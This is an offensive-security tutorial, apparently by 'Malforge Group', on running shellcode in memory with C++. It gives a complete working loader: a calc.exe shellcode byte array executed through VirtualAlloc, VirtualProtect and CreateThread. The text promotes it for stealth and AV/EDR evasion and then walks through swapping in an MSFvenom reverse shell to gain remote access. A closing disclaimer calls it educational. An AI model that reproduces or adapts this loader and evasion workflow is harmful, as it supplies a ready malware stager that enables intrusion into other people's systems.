# Executing Shellcode with C++

## Introduction

Hello everyone, today I am going to teach you how to execute malicious shellcode with C++.

## Why Use Shellcode?

Shellcode is often used in scenarios where:

- **Stealth is critical** — It avoids writing to disk.
- **AV/EDR evasion** — Memory-resident payloads are harder to detect.
- **Precise control** over execution — You're writing and executing memory buffers directly.

![image](https://github.com/user-attachments/assets/86729f34-8ff9-4a2d-b637-7fb9dbb26312)

## The Payload: `calc.exe`

We'll use a shellcode payload that spawns the calculator (`calc.exe`). This is commonly used as a proof-of-concept (PoC) for demonstrating shellcode execution.

---

## Full C++ Code

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
  void * my_payload_mem; // memory buffer for payload
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

  rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {

    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
  }
  return 0;
}
```

## Proof of Concept (PoC)
To illustrate this technique, we can use a reverse shell payload created with **MSFvenom in C format**. Follow these steps:

Generate Shellcode: Use **MSFvenom** to create a reverse shell payload and format it as a C array.

![image](https://github.com/user-attachments/assets/85592f72-2ddc-4519-9cc3-08d74ce71fb4)

Insert Payload: Update the payload array in the code with the generated shellcode.

![image](https://github.com/user-attachments/assets/6b98ec6a-2354-4368-aa05-9a837c830605)

Compile and Run: Compile the C++ code into an executable (EXE) and run it to initiate the reverse shell.

![image](https://github.com/user-attachments/assets/94d3293c-b47c-4738-9fdf-df5b33aa8526)

![image](https://github.com/user-attachments/assets/4c2e683e-2659-4eff-ac64-034babac6d7c)

Upon running the EXE, the reverse shell connects, granting remote access to the system

![image](https://github.com/user-attachments/assets/087d4378-0658-4b46-80d2-f45b4203ab91)

![image](https://github.com/user-attachments/assets/a6e2233f-c24a-45d8-8c19-cee4358c0066)

## Conclusion

This guide covered how to execute shellcode in C++ and highlighted its stealth advantages. By running code in memory, shellcode can bypass many standard security measures. I hope this article was insightful and helped you understand shellcode execution.

> ⚠️ **Disclaimer:**  
> This code is for **educational purposes only**. Executing shellcode can be **highly dangerous** and may trigger antivirus alerts or cause system instability.  
> Do **not** run this code on production machines or without proper knowledge.  
> Always conduct experiments in **isolated environments** such as virtual machines or sandboxes.
---

Thank you for reading!

— **Malforge Group**
